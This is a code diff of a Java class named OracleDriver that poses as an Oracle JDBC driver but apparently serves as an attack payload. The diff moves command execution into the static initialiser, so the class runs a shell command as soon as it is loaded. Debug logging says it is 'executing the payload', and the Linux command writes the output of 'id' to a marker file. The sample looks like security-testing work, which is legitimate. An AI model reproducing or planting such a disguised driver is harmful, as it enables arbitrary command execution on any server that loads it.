@@ -13,31 +13,19 @@ public class OracleDriver implements java.sql.Driver {
     private static final String CMD_LINUX = "/usr/bin/id > /tmp/SECURITYFAIL.txt";
 
     static{
-        try{
-            OracleDriver driverInst = new OracleDriver();
-            DriverManager.registerDriver(driverInst);
-        } catch(Exception e) {
-            if(DEBUG){
-                Logger.getGlobal().severe("Unable to register the driver: "+e.getMessage());
-            }
-        }
-    }
+        // we don't actually need to register the driver, can use this statis block for execution
+        // OracleDriver driverInst = new OracleDriver();
+        // DriverManager.registerDriver(driverInst);
 
-    public boolean acceptsURL(String url){
         if(DEBUG){
-            Logger.getGlobal().info("acceptsURL() called: "+url);
+            Logger.getGlobal().info("Entered static JDBC driver initialization block, executing the payload...");
         }
 
-        return true; // don't think this matter, but just in case
+        _run();
     }
 
-    // this is the main method here!
-    public Connection connect(String url, Properties info){
+    private static void _run(){
         String shell, shell_opt, cmd;
-
-        if(DEBUG){
-            Logger.getGlobal().info("connect() called: "+url);
-        }
 
         if( System.getProperty("os.name").toLowerCase().contains("windows") ){
             // Windows
@@ -69,9 +57,26 @@ public class OracleDriver implements java.sql.Driver {
                 Logger.getGlobal().severe("Unable to execute the payload: "+e.getMessage());
             }
         }
+    }
+
+    // JDBC methods below
+
+    public boolean acceptsURL(String url){
+        if(DEBUG){
+            Logger.getGlobal().info("acceptsURL() called: "+url);
+        }
+
+        return false;
+    }
+
+    public Connection connect(String url, Properties info){
+        if(DEBUG){
+            Logger.getGlobal().info("connect() called: "+url);
+        }
 
         return null;
     }
+
 
     public int getMajorVersion(){
         if(DEBUG){
